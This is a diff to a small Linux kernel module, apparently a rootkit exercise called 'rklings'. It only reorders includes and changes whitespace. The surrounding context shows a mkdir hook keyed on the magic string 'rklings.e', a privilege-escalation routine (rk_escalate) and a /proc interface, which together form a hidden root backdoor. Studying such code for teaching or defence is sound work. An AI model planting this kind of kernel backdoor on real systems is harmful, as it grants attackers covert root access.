@@ -1,17 +1,17 @@
 // SPDX-License-Identifier: GPL-2.0
+#include "rklings_hook.h"
+#include <linux/atomic.h>
+#include <linux/cred.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/string.h>
-#include <linux/cred.h>
-#include <linux/sched/task.h>
 #include <linux/proc_fs.h>
+#include <linux/sched/task.h>
 #include <linux/seq_file.h>
-#include <linux/atomic.h>
-#include "rklings_hook.h"
+#include <linux/string.h>
 
-#define RK_CMD "rklings.e"
-#define RK_CMD_LEN 9
+#define RK_CMD	     "rklings.e"
+#define RK_CMD_LEN   9
 #define RK_PROC_NAME "rklings"
 
 static atomic_t rk_target_pid = ATOMIC_INIT(0);
@@ -30,7 +30,8 @@ static int rk_escalate(void)
 	return 0;
 }
 
-RK_ON_MKDIR(name) {
+RK_ON_MKDIR(name)
+{
 	int pid;
 	int ret;
 
@@ -86,10 +87,10 @@ static int rk_proc_open(struct inode *inode, struct file *file)
 }
 
 static const struct proc_ops rk_proc_ops = {
-	.proc_open    = rk_proc_open,
-	.proc_read    = seq_read,
-	.proc_lseek   = seq_lseek,
-	.proc_release = single_release,
+    .proc_open = rk_proc_open,
+    .proc_read = seq_read,
+    .proc_lseek = seq_lseek,
+    .proc_release = single_release,
 };
 
 static int __init rk_init(void)
